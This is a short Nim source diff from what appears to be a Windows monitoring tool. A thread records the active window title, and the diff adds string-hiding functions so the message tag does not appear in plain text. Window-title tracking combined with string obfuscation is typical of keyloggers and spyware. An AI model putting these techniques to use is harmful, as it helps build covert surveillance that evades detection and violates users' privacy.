@@ -12,6 +12,9 @@ from winim/winstr import winstrConverterWStringToLPWSTR
 from winim/winstr import newWString
 from winim/winstr import `$`
 
+from ../functions/hideString import e
+from ../functions/hideString import d
+
 from ../constants import BUFFER_LENGTH
 
 from ../flags import WINDOW_NAME_THREAD_CHECK_INTERVAL
@@ -42,7 +45,7 @@ proc initWindowNameThread*(): void {.thread.} =
     let (worked, windowName) = getWindowName()
 
     if worked == true and windowName != prevWindowName:
-      mainChannel.send ("wn", encode windowName)
+      mainChannel.send (d e "wn", encode windowName)
       prevWindowName = windowName
 
     sleep(WINDOW_NAME_THREAD_CHECK_INTERVAL)
